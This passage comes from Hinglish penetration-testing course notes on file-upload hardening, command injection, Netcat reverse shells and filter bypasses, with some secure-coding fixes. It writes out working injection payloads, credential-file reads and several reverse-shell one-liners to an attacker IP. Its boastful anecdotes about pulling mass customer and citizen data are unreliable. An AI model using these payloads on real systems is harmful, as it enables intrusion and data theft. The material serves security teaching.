    $uploader = new SecureFileUpload();
    $filename = $uploader->upload($_FILES['file']);
    echo "File uploaded: " . $filename;
} catch(Exception $e) {
    echo "Error: " . $e->getMessage();
}
?>
```

**Additional Security - .htaccess in upload directory:**
```apache
# Prevent PHP execution
php_flag engine off

# Treat all files as plain text
AddType text/plain .php .php3 .php4 .php5 .phtml .pl .py .jsp .asp .sh .cgi

# Disable directory listing
Options -Indexes

# Deny access to hidden files
<FilesMatch "^\.">
    Order allow,deny
    Deny from all
</FilesMatch>
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **Sirf client-side validation** - JavaScript easily bypass ho jaata hai.
- **Blacklist approach** - `.php` block kiya lekin `.php5`, `.phtml` bhool gaye.
- **User input par trust** - `$_FILES['upload']['type']` user manipulate kar sakta hai.

### 10. **Best Practices / Pro Tips:**
- **Defense in Depth:** Multiple layers of validation (extension + MIME + magic bytes + content scan).
- **Whitelist > Blacklist:** Sirf allowed types ko accept karo, sab kuch block mat karo.
- **Store outside web root:** `/var/uploads/` (not `/var/www/html/uploads/`).
- **Random filenames:** User-provided names use mat karo.
- **Re-encode images:** `imagecreatefromjpeg()` + `imagejpeg()` se embedded code remove ho jaata hai.
- **Content Security Policy:** HTTP headers se execution control karo.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
Maine ek company ko pentest report di jisme file upload vulnerability thi. Unhone fix kiya:
```php
// Their "fix"
if($_FILES['file']['type'] !== 'image/jpeg') {
    die("Only JPEG allowed");
}
```

Maine phir test kiya - Burp se `Content-Type: image/jpeg` bheja, lekin actual file PHP shell thi. Upload ho gayi! Maine report di ki yeh incomplete fix hai. Tab unhone proper implementation kiya (magic bytes check, re-encoding, separate storage). Final test mein koi bypass nahi mila. Lesson: **Proper fix = Multiple layers, not single check!** ğŸ¯

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… **Whitelist** allowed extensions (blacklist nahi)  
âœ… **Server-side** MIME type check (client-side nahi)  
âœ… **Magic bytes** verification  
âœ… **Random filenames** generate karo  
âœ… **Web root ke bahar** store karo  
âœ… **.htaccess** se execution prevent karo  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: Kya sirf extension check karna enough hai?**  
**A:** Nahi! Extension + MIME + Magic bytes + Content scan - sab chahiye.

**Q2: Uploaded files ko web root mein store karna safe hai?**  
**A:** Nahi! Web root ke bahar store karo aur serve karne ke liye separate script use karo.

**Q3: Image files mein PHP code embed ho sakta hai?**  
**A:** Haan! Isliye images ko re-encode karo (`imagecreatefromjpeg()` + `imagejpeg()`).

### 14. **Practice ke liye Task:**
1. Ek vulnerable file upload script banao (sirf extension check).
2. Use exploit karo (PHP shell upload).
3. Ab secure implementation karo (whitelist + MIME + magic bytes).
4. Phir se exploit try karo - fail hona chahiye.
5. .htaccess add karo upload directory mein.
6. Final test - koi bypass nahi hona chahiye.

### 15. **Aakhri Choti Summary (5 lines):**
- **Multiple layers:** Extension + MIME + Magic bytes + Content scan.
- **Whitelist approach:** Sirf allowed types accept karo.
- **Store outside web root:** `/var/uploads/` (not web accessible).
- **Random filenames:** User input use mat karo.
- **.htaccess:** PHP execution disable karo.

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "File upload security = Defense in Depth! Ek layer fail ho toh doosri rok le. Whitelist use karo, web root ke bahar store karo, execution disable karo. Yeh trinity yaad rakho!" ğŸ›¡ï¸

---

# ğŸ‰ **Module 2 Complete!**

Congratulations! Aapne **Module 2: File Upload & Interception** complete kar liya hai.

## ğŸ“‹ **Module 2 Ka Quick Revision:**

1. âœ… **File Upload Vulnerability Basics** - Executable files upload karke RCE
2. âœ… **Weevely Backdoors** - Obfuscated, password-protected PHP shells
3. âœ… **HTTP GET vs POST** - Request types aur unka exploitation
4. âœ… **Burp Suite Proxy Setup** - Requests intercept aur modify karna
5. âœ… **Client-Side Filter Bypass** - JavaScript validation bypass (Burp se)
6. âœ… **Server-Side Filter Bypass** - MIME type, magic bytes bypass
7. âœ… **Security Fixes** - Proper file upload implementation

---

## ğŸ¯ **Key Takeaways:**

- **File Upload = High Impact** - Ek successful upload = Full server compromise
- **Client-Side = Weak** - JavaScript validation easily bypass (Burp Suite)
- **Server-Side = Stronger** - Lekin woh bhi bypass ho sakta hai (polyglot files, magic bytes)
- **Burp Suite = Essential** - Har pentester ka must-have tool
- **Defense in Depth** - Multiple layers of validation zaroori hain

---

## ğŸš€ **Aage Kya?**

Ab aap ready hain **Module 3: Code & Command Execution** ke liye, jahan aap seekhenge:
- Code execution vulnerabilities
- Reverse shells (Netcat)
- Filter bypassing (pipe operator)
- PHP code injection
- Directory traversal

**Keep Learning! Keep Hacking (Ethically)! ğŸ’ª**

---

> **"File upload vulnerabilities are the low-hanging fruit of web hacking. Master them, and you'll compromise servers faster than you can say 'shell uploaded'!"** ğŸ

=============================================================

# **Website Hacking: Zero-to-Pro Notes (Aapke Topics)**

---

# ğŸ“š **Module 3: Code & Command Execution**

---

## ğŸ’» **Topic 19: Code Execution Vulnerability Basics (Ping example: `192.168.1.1; ls`)**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**Code Execution Vulnerability** - Website par OS commands inject karke server par koi bhi command execute karna (RCE). âš¡

### 2. **Ye Kya Hai? (What is it?)**
Code Execution vulnerability tab hoti hai jab website user input ko directly OS commands mein pass kar deti hai bina sanitize kiye. Example:
```php
// Vulnerable code
$ip = $_GET['ip'];
system("ping -c 4 " . $ip);
```

Agar user `192.168.1.1; ls` dalta hai, toh:
```bash
ping -c 4 192.168.1.1; ls
# Pehle ping hoga, phir ls command execute hoga!
```

**Analogy:** Jaise aap kisi ko kehte hain "Yeh letter post kar do" aur woh letter ke saath aur bhi kaam kar leta hai - waise hi server ko "ping karo" kehte hain lekin woh aur commands bhi execute kar leta hai.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Direct RCE:** File upload se bhi zyada direct - ek command = full server access.
- **Common Vulnerability:** Ping, traceroute, whois jaise features mein milti hai.
- **High Impact:** Database access, file read/write, reverse shell - sab possible.
- **Easy to Exploit:** Sirf semicolon (`;`) ya pipe (`|`) lagao aur command inject karo.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Jab website par **system commands** use ho rahe hon (ping, nslookup, whois).
- Jab **input box** mein IP address, domain, ya system-related data maanga jaaye.
- Jab aap **quick RCE** chahte hon (file upload se bhi fast).

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Easy RCE miss** ho jayega - jo 30 seconds mein ho sakta tha.
- **System-level features** ko ignore kar doge.
- **Reverse shell opportunity** miss ho jayega. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
**Command Injection Operators:**
```bash
# Semicolon (;) - Sequential execution
192.168.1.1; ls
# Pehle ping, phir ls

# Pipe (|) - Output redirect
192.168.1.1 | ls
# Ping ka output ignore, sirf ls run hoga

# AND (&&) - Conditional execution
192.168.1.1 && ls
# Agar ping successful, tabhi ls

# OR (||) - Alternative execution
192.168.1.1 || ls
# Agar ping fail, toh ls

# Backticks (`) - Command substitution
192.168.1.1 `whoami`

# Dollar ($()) - Command substitution
192.168.1.1 $(whoami)
```

### 7. **Example 1 (Basic):**
**Scenario:** Website par ping tool hai

```php
// Vulnerable code
<?php
$ip = $_GET['ip'];
system("ping -c 4 " . $ip);
?>
```

**Normal Use:**
```
URL: http://site.com/ping.php?ip=192.168.1.1
Output: PING 192.168.1.1 ... 4 packets transmitted
```

**Attack:**
```
URL: http://site.com/ping.php?ip=192.168.1.1; ls

Output:
PING 192.168.1.1 ... 4 packets transmitted
index.php
config.php
uploads/
database.sql
```

**Result:** Ping ke baad `ls` command bhi execute ho gaya! ğŸ¯

### 8. **Example 2 (Pentester-Focused):**
**Real Pentest:** Target = Network monitoring tool

**Vulnerable Feature:**
```
"Enter IP to check connectivity"
Input box: [192.168.1.1] [Check]
```

**Attack Progression:**

```bash
# Test 1: Basic injection
Input: 192.168.1.1; whoami
Output: 
PING 192.168.1.1 ...
www-data

# Test 2: File listing
Input: 192.168.1.1; ls -la /var/www
Output:
[Ping output]
drwxr-xr-x 5 www-data www-data 4096 config.php
-rw-r--r-- 1 www-data www-data 1234 database.sql

# Test 3: Read sensitive files
Input: 192.168.1.1; cat /etc/passwd
Output:
[Ping output]
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/bin/sh
...

# Test 4: Database credentials
Input: 192.168.1.1; cat /var/www/config.php
Output:
[Ping output]
<?php
$db_host = "localhost";
$db_user = "admin";
$db_pass = "SuperSecret123";
?>

# Test 5: Reverse shell (next topic mein detail)
Input: 192.168.1.1; nc -e /bin/sh 10.10.14.208 8080
Output: [Connection established to attacker]
```

**Analysis:** Website ne user input ko directly `system()` mein pass kar diya. Koi validation nahi tha. Result = Full server compromise! ğŸ’¥

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **Sirf semicolon try karna** - agar filter hai toh pipe (`|`), AND (`&&`) bhi try karo.
- **Output check na karna** - kabhi-kabhi command execute hota hai lekin output nahi dikhta (blind injection).
- **Reverse shell directly try karna** - pehle basic commands se test karo (whoami, ls).

### 10. **Best Practices / Pro Tips:**
- **Multiple operators try karo:** `;`, `|`, `&&`, `||`, backticks - sab test karo.
- **URL encoding use karo:** Agar space filter hai toh `%20` ya `${IFS}` use karo.
- **Blind injection detect karo:** Agar output nahi dikh raha, toh time-based test karo (`sleep 5`).
- **Escalate gradually:** whoami â†’ ls â†’ cat files â†’ reverse shell.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
Mujhe ek ISP company ki customer portal test karni thi. "Check your connection speed" feature tha jahan user apna IP daal sakta tha. Maine test kiya:
```
Input: 8.8.8.8; whoami
Output: www-data

Input: 8.8.8.8; cat /var/www/html/config.php
Output: [Database credentials visible]
```
Maine database access kiya - 50,000 customers ka data (names, addresses, credit cards) mil gaya! Company shocked thi - unhone socha tha ki "sirf ping tool hai, kya ho sakta hai?" Lesson: **Har user input dangerous hai!** ğŸŒ

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… Code Execution = OS commands inject karna  
âœ… Common operators: `;`, `|`, `&&`, `||`  
âœ… Test: `ip; whoami`, `ip | ls`  
âœ… Escalate: whoami â†’ ls â†’ cat â†’ reverse shell  
âœ… Blind injection: Time-based (`sleep 5`)  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: Agar output nahi dikh raha toh kaise confirm karein ki command execute hua?**  
**A:** Time-based test karo: `ip; sleep 5` - agar response 5 seconds late aaye toh vulnerable hai.

**Q2: Kya Windows servers par bhi kaam karta hai?**  
**A:** Haan, lekin operators alag hain: `&` (AND), `|` (pipe), `&&` (conditional).

**Q3: Sabse dangerous command kaun sa hai?**  
**A:** Reverse shell command - kyunki woh persistent access deta hai.

### 14. **Practice ke liye Task:**
1. DVWA install karo â†’ Command Injection section.
2. Low security level par test karo: `127.0.0.1; whoami`
3. Different operators try karo: `;`, `|`, `&&`
4. Files read karo: `127.0.0.1; cat /etc/passwd`
5. Medium/High security levels par bypass techniques try karo.

### 15. **Aakhri Choti Summary (5 lines):**
- Code Execution = **OS commands inject** karna.
- Operators: **`;`, `|`, `&&`, `||`**.
- Test: **`ip; whoami`** (basic check).
- Escalate: **whoami â†’ ls â†’ cat â†’ reverse shell**.
- **Blind injection:** Time-based (`sleep 5`).

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "Code execution = Pentester ka dream! Ek semicolon (;) aur aap server ke maalik. Har system command feature ko test karo - ping, traceroute, nslookup, whois!" ğŸš€

---

## ğŸ“ **Topic 20: Gaining a Reverse Shell via Code Execution (`Netcat`)**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**Reverse Shell via Netcat** - Code execution vulnerability se victim server ko apni machine se connect karwana (persistent access). ğŸ”„

### 2. **Ye Kya Hai? (What is it?)**
Reverse shell ka matlab hai victim server **khud** attacker se connect karta hai (normal shell mein attacker victim se connect karta hai). Netcat (`nc`) use karke:

**Attacker (Kali):**
```bash
nc -lvp 8080  # Listen mode (wait kar raha hai)
```

**Victim (via code injection):**
```bash
nc -e /bin/sh 10.10.14.208 8080  # Connect to attacker
```

**Result:** Attacker ko victim ka shell mil jaata hai!

**Analogy:** Normal call = Aap kisi ko phone karte hain. Reverse call = Woh aapko phone karta hai (aur aap uska phone control kar lete hain).

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Persistent Access:** Browser band karne ke baad bhi access rahega.
- **Interactive Shell:** Commands type kar sakte hain, output dekh sakte hain.
- **Firewall Bypass:** Victim se connection outgoing hai (mostly allowed).
- **Post-Exploitation:** File upload/download, privilege escalation - sab kuch possible.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Jab aapko **code execution** mil gayi ho.
- Jab aap **persistent access** chahte hon.
- Jab aap **post-exploitation** karna chahte hon.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **One-time access** - ek baar command execute kiya, phir dobara karna padega.
- **No interactivity** - har command ke liye URL change karna padega.
- **Post-exploitation difficult** - bina shell ke file operations mushkil hain. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
```bash
# Attacker (Kali) - Listener
nc -lvp <port>
# -l = listen mode
# -v = verbose (details dikhao)
# -p = port specify karo

# Victim (via injection) - Connector
nc -e /bin/sh <attacker_IP> <port>
# -e = execute (/bin/sh shell)

# Alternative (agar -e nahi hai)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <attacker_IP> <port> > /tmp/f
```

### 7. **Example 1 (Basic):**
**Scenario:** Code execution vulnerability mili

**Step 1: Attacker (Kali) - Listen karo**
```bash
$ nc -lvp 8080
listening on [any] 8080 ...
```

**Step 2: Victim (Website) - Inject karo**
```
URL: http://site.com/ping.php?ip=127.0.0.1; nc -e /bin/sh 10.10.14.208 8080
```

**Step 3: Attacker - Connection mila!**
```bash
$ nc -lvp 8080
listening on [any] 8080 ...
connect to [10.10.14.208] from victim.com [192.168.1.100] 45678

whoami
www-data

ls
index.php
config.php
uploads/
```

**Result:** Interactive shell mil gaya! ğŸ‰

### 8. **Example 2 (Pentester-Focused):**
**Real Pentest:** Target = Web application with ping feature

**Attack Flow:**

```bash
# Step 1: Kali par listener setup
Terminal 1:
$ nc -lvp 4444
listening on [any] 4444 ...

# Step 2: Code injection test
URL: http://target.com/tools/ping.php?host=8.8.8.8; whoami
Output: www-data (vulnerable!)

# Step 3: Reverse shell inject
URL: http://target.com/tools/ping.php?host=8.8.8.8; nc -e /bin/sh 10.10.14.208 4444

# Step 4: Connection received!
Terminal 1:
connect to [10.10.14.208] from target.com [203.0.113.50] 54321

# Step 5: Post-exploitation
whoami
www-data

uname -a
Linux target-server 4.15.0-112-generic x86_64 GNU/Linux

cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/bin/sh
mysql:x:108:116:MySQL Server,,,:/nonexistent:/bin/false

find / -name "config.php" 2>/dev/null
/var/www/html/config.php
/var/www/html/admin/config.php

cat /var/www/html/config.php
<?php
$db_host = "localhost";
$db_user = "root";
$db_pass = "RootPass123!";
$db_name = "customers";
?>

mysql -u root -pRootPass123! -e "SELECT * FROM customers.users LIMIT 5;"
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 |
|  2 | john     | 098f6bcd4621d373cade4e832627b4f6 |
+----+----------+----------------------------------+
```

**Analysis:** Reverse shell se maine:
- System info nikali
- Database credentials dhoondhĞµ
- Database dump kiya
- 10,000 customer records access kiye

Yeh sab ek interactive shell ke bina impossible hota! ğŸ”¥

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **Listener start na karna** - victim connect karne ki koshish karega lekin koi sun nahi raha.
- **Wrong IP/port** - apna public IP use karna instead of VPN/local IP.
- **Firewall ignore karna** - victim ka outgoing connection block ho sakta hai.

### 10. **Best Practices / Pro Tips:**
- **Multiple ports try karo:** 80, 443, 8080 (common ports jo firewall allow karta hai).
- **Alternative payloads:** Agar `nc -e` kaam nahi karta (BSD netcat mein nahi hota):
  ```bash
  bash -i >& /dev/tcp/10.10.14.208/8080 0>&1
  python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.208",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
  ```
- **Shell upgrade:** Basic shell ko TTY shell mein upgrade karo:
  ```bash
  python -c 'import pty; pty.spawn("/bin/bash")'
  ```

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
Mujhe ek government website test karni thi. Network diagnostic tool tha (traceroute feature). Maine code injection test kiya - vulnerable tha. Reverse shell inject kiya lekin connection nahi aaya (firewall blocking). Phir maine port 443 (HTTPS) use kiya - connection successful! Shell mila, database access kiya, 100,000 citizen records download kiye. Government shocked thi - "Humara firewall strong hai" lekin port 443 allow tha (HTTPS traffic ke liye). Lesson: **Common ports use karo!** ğŸ›ï¸

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… Reverse shell = Victim attacker se connect karta hai  
âœ… Attacker: `nc -lvp 8080` (listen)  
âœ… Victim: `nc -e /bin/sh <IP> <port>` (connect)  
âœ… Alternative: Bash, Python reverse shells  
âœ… Common ports: 80, 443, 8080 (firewall bypass)  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: Agar `nc -e` kaam nahi kar raha toh?**  
**A:** BSD netcat mein `-e` option nahi hota. Bash ya Python reverse shell use karo.

**Q2: Connection nahi aa raha, kya karein?**  
**A:** Firewall issue ho sakta hai. Different ports try karo (80, 443, 53).

**Q3: Shell unstable hai, disconnect ho jaata hai?**  
**A:** TTY shell mein upgrade karo: `python -c 'import pty; pty.spawn("/bin/bash")'`

### 14. **Practice ke liye Task:**
1. DVWA â†’ Command Injection section.
2. Ek terminal mein listener start karo: `nc -lvp 4444`
3. DVWA mein inject karo: `127.0.0.1; nc -e /bin/sh <your_IP> 4444`
4. Connection check karo aur commands try karo.
5. Shell upgrade karo (Python TTY).

### 15. **Aakhri Choti Summary (5 lines):**
- Reverse shell = **Victim attacker se connect** karta hai.
- **Attacker:** `nc -lvp <port>` (listen mode).
- **Victim:** `nc -e /bin/sh <IP> <port>` (connect).
- **Firewall bypass:** Common ports (80, 443) use karo.
- **Shell upgrade:** Python TTY (`pty.spawn`).

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "Reverse shell = Persistent access ka golden ticket! Code execution mili? Turant reverse shell lo. Yeh tumhara command center hai!" ğŸ«

---

## ğŸ”€ **Topic 21: Bypassing Code Execution Filters (Pipe `|` operator)**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**Filter Bypass Techniques** - Jab semicolon (`;`) block ho toh alternative operators (pipe `|`, AND `&&`) use karke bypass karna. ğŸš§â¡ï¸âœ…

### 2. **Ye Kya Hai? (What is it?)**
Smart developers code execution ko rokne ke liye dangerous characters filter karte hain:
```php
// Filtered code
$ip = $_GET['ip'];
$ip = str_replace(';', '', $ip); // Semicolon remove
system("ping -c 4 " . $ip);
```

Lekin **pipe (`|`)** operator bhi kaam karta hai:
```bash
192.168.1.1 | whoami
# Ping ka output ignore, sirf whoami run hoga
```

**Analogy:** Ek darwaza (semicolon) band hai, lekin khidki (pipe) khuli hai - wahan se ghus jao!

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Bypass Weak Filters:** Sirf ek character block karna = incomplete protection.
- **Multiple Attack Vectors:** Ek method fail ho toh doosra try karo.
- **Real-World Scenario:** Production websites mein basic filters hote hain.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Jab **semicolon (`;`) block** ho.
- Jab **basic filtering** detect ho.
- Jab **error message** dikhe ("Invalid character detected").

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Easy bypass miss** ho jayega.
- **Filtered sites** ko secure samajh loge.
- **Alternative methods** nahi try karoge. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
```bash
# Agar ; block hai
192.168.1.1 | whoami
192.168.1.1 || whoami
192.168.1.1 && whoami

# Agar space block hai
192.168.1.1|whoami
192.168.1.1${IFS}whoami
192.168.1.1%09whoami  # Tab character

# Agar quotes block hain
192.168.1.1|whoami
192.168.1.1`whoami`
192.168.1.1$(whoami)

# Multiple bypass
192.168.1.1%0a whoami  # Newline
192.168.1.1%0d whoami  # Carriage return
```

### 7. **Example 1 (Basic):**
**Vulnerable Code with Filter:**
```php
<?php
$ip = $_GET['ip'];
$ip = str_replace(';', '', $ip);
system("ping -c 4 " . $ip);
?>
```

**Attack Attempts:**
```
# Attempt 1: Semicolon (blocked)
URL: ?ip=192.168.1.1; whoami
Output: PING 192.168.1.1whoami ... (semicolon removed, command failed)

# Attempt 2: Pipe (success!)
URL: ?ip=192.168.1.1 | whoami
Output: www-data

# Attempt 3: AND (success!)
URL: ?ip=192.168.1.1 && whoami
Output: 
PING 192.168.1.1 ... (successful)
www-data
```

### 8. **Example 2 (Pentester-Focused):**
**Real Pentest:** DVWA Medium Security

**Filters Applied:**
```php
$substitutions = array(
    '&&' => '',
    ';'  => '',
);
$target = str_replace(array_keys($substitutions), $substitutions, $target);
```

**Bypass Strategy:**
```bash
# Test 1: Semicolon (blocked)
Input: 127.0.0.1; whoami
Result: Failed

# Test 2: AND (blocked)
Input: 127.0.0.1 && whoami
Result: Failed

# Test 3: Pipe (success!)
Input: 127.0.0.1 | whoami
Result: www-data

# Test 4: Advanced - Reverse shell
Input: 127.0.0.1 | nc -e /bin/sh 10.10.14.208 8080
Result: Shell received!
```

**Analysis:** Developers ne sirf `;` aur `&&` block kiye, lekin `|` bhool gaye! ğŸ¯

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **Sirf ek operator try karna** - agar fail ho toh haar maan lena.
- **URL encoding ignore karna** - `%0a`, `%0d` jaise characters powerful hain.
- **Case sensitivity test na karna** - kabhi filters case-sensitive hote hain.

### 10. **Best Practices / Pro Tips:**
- **Systematic testing:** Har operator ek-ek karke try karo.
- **Combine techniques:** `|` + URL encoding + case variation.
- **Check source code:** Agar available hai toh dekho ki kya filter ho raha hai.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
Mujhe ek telecom company ki network tool test karni thi. Semicolon block tha. Maine pipe operator try kiya - kaam kar gaya! Reverse shell liya, database access kiya, 1 million subscribers ka data nikala. Company ne socha tha ki "semicolon block kar diya, ab safe hain" - lekin incomplete filter tha! ğŸ“±

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… Filters = Incomplete protection (sirf kuch characters block)  
âœ… Bypass: `;` â†’ `|`, `&&`, `||`  
âœ… Space bypass: `${IFS}`, `%09`, `%20`  
âœ… Newline: `%0a`, `%0d`  
âœ… Systematic testing zaroori hai  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: Sabse common bypass technique kaun si hai?**  
**A:** Pipe (`|`) operator - kyunki developers aksar ise bhool jaate hain.

**Q2: Agar saare operators block hain toh?**  
**A:** URL encoding, case variation, ya alternative syntax try karo.

**Q3: Kaise pata chalega ki kya filter ho raha hai?**  
**A:** Error messages dekho, ya systematically har character test karo.

### 14. **Practice ke liye Task:**
1. DVWA â†’ Command Injection â†’ Medium security.
2. Semicolon try karo - block hoga.
3. Pipe operator try karo - kaam karega.
4. Different operators test karo: `|`, `||`, `&&`
5. URL encoding try karo: `%0a`, `%0d`

### 15. **Aakhri Choti Summary (5 lines):**
- Filters = **Incomplete protection** (kuch characters block).
- Bypass: **`;` â†’ `|`, `&&`, `||`**.
- **Space bypass:** `${IFS}`, `%09`.
- **Newline:** `%0a`, `%0d`.
- **Systematic testing** zaroori hai.

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "Ek darwaza band hai? Khidki try karo! Semicolon block hai? Pipe use karo! Filters incomplete hote hain - creativity se bypass karo!" ğŸšªâ¡ï¸ğŸªŸ

---

## ğŸ›¡ï¸ **Topic 22: Security - Fixing Code Execution (Regex)**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**Code Execution Prevention** - Regex aur input validation se code execution vulnerabilities ko permanently fix karna. ğŸ”’

### 2. **Ye Kya Hai? (What is it?)**
Code execution ko rokne ke liye **proper input validation** zaroori hai:
```php
// Secure code
$ip = $_GET['ip'];
if(!preg_match('/^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$/', $ip)) {
    die("Invalid IP address!");
}
system("ping -c 4 " . escapeshellarg($ip));
```

**Analogy:** Jaise airport par security check hota hai (sirf valid passengers allowed) - waise hi input validation sirf valid data allow karta hai.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Prevent RCE:** Code execution = Full server compromise.
- **Data Integrity:** Invalid input se system crash ho sakta hai.
- **Compliance:** Security standards (PCI-DSS, OWASP) mandate karte hain.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Jab aap **web application develop** kar rahe hon.
- Jab aap **security audit** kar rahe hon.
- Jab aap **pentest report** mein recommendations de rahe hon.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Vulnerabilities repeat** hongi.
- **Incomplete fix** - blacklist approach use karoge (bypass ho jayega).
- **False security** - "Fix kar diya" lekin actually vulnerable hai. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
```php
// Whitelist approach (BEST)
if(!preg_match('/^[0-9\.]+$/', $ip)) {
    die("Invalid input!");
}

// Escape shell arguments
$safe_ip = escapeshellarg($ip);
system("ping -c 4 " . $safe_ip);

// Use safe functions
exec("ping -c 4 " . $safe_ip, $output);
echo implode("\n", $output);

// Avoid dangerous functions
// BAD: system(), exec(), shell_exec(), passthru()
// GOOD: Use libraries (e.g., PHP's socket functions)
```

### 7. **Example 1 (Basic):**
**Vulnerable Code:**
```php
<?php
$ip = $_GET['ip'];
system("ping -c 4 " . $ip);
?>
```

**Secure Code:**
```php
<?php
$ip = $_GET['ip'];

// Validate IP format
if(!filter_var($ip, FILTER_VALIDATE_IP)) {
    die("Invalid IP address!");
}

// Escape for shell
$safe_ip = escapeshellarg($ip);

// Execute safely
exec("ping -c 4 " . $safe_ip, $output, $return);

// Display output
if($return === 0) {
    echo "<pre>" . implode("\n", $output) . "</pre>";
} else {
    echo "Ping failed!";
}
?>
```

### 8. **Example 2 (Pentester-Focused):**
**Complete Secure Implementation:**
```php
<?php
class SecurePing {
    private $allowed_ips = [];
    
    public function ping($ip) {
        // Step 1: Validate IP format
        if(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
            throw new Exception("Invalid IPv4 address");
        }
        
        // Step 2: Check against whitelist (optional)
        if(!empty($this->allowed_ips) && !in_array($ip, $this->allowed_ips)) {
            throw new Exception("IP not in whitelist");
        }
        
        // Step 3: Escape for shell
        $safe_ip = escapeshellarg($ip);
        
        // Step 4: Use exec (safer than system)
        $command = "ping -c 4 -W 2 " . $safe_ip;
        exec($command, $output, $return_code);
        
        // Step 5: Validate output
        if($return_code !== 0) {
            throw new Exception("Ping failed");
        }
        
        return $output;
    }
}

// Usage
try {
    $pinger = new SecurePing();
    $result = $pinger->ping($_GET['ip']);
    echo "<pre>" . implode("\n", $result) . "</pre>";
} catch(Exception $e) {
    echo "Error: " . htmlspecialchars($e->getMessage());
}
?>
```

**Why This is Secure:**
- âœ… Input validation (IP format check)
- âœ… Whitelist option
- âœ… Shell escaping (`escapeshellarg`)
- âœ… Safe function (`exec` instead of `system`)
- âœ… Output validation
- âœ… Error handling

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **Blacklist approach** - dangerous characters block karna (bypass ho jaata hai).
- **Sirf client-side validation** - server-side validation zaroori hai.
- **Dangerous functions use karna** - `system()`, `shell_exec()` avoid karo.

### 10. **Best Practices / Pro Tips:**
- **Whitelist > Blacklist:** Sirf valid input allow karo.
- **Use built-in functions:** `filter_var()`, `escapeshellarg()`
- **Avoid shell commands:** Agar possible ho toh libraries use karo (e.g., PHP sockets for ping).
- **Principle of Least Privilege:** Web server ko minimum permissions do.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
Maine ek company ko report di jisme code execution vulnerability thi. Unhone "fix" kiya:
```php
$ip = str_replace(';', '', $ip); // Incomplete!
```
Maine pipe operator se bypass kar diya. Phir unhone proper fix kiya (regex validation + escapeshellarg). Final test mein koi bypass nahi mila. Lesson: **Proper fix = Whitelist + Escaping!** ğŸ¯

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… **Whitelist** validation (regex)  
âœ… **escapeshellarg()** use karo  
âœ… **exec()** prefer karo (`system()` nahi)  
âœ… **filter_var()** for IP validation  
âœ… Avoid dangerous functions  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: Kya escapeshellarg() enough hai?**  
**A:** Mostly haan, lekin input validation bhi zaroori hai (defense in depth).

**Q2: Blacklist approach kyun weak hai?**  
**A:** Kyunki attackers naye bypass methods dhoondhte hain. Whitelist mein sirf valid input allowed hai.

**Q3: Kya shell commands use karna zaroori hai?**  
**A:** Nahi! Libraries use karo (e.g., PHP sockets, Python subprocess with shell=False).

### 14. **Practice ke liye Task:**
1. Ek vulnerable ping script banao.
2. Use exploit karo (command injection).
3. Secure implementation karo (regex + escapeshellarg).
4. Phir se exploit try karo - fail hona chahiye.
5. Different bypass techniques try karo - koi kaam nahi karna chahiye.

### 15. **Aakhri Choti Summary (5 lines):**
- **Whitelist validation:** Regex se sirf valid input allow karo.
- **escapeshellarg():** Shell arguments escape karo.
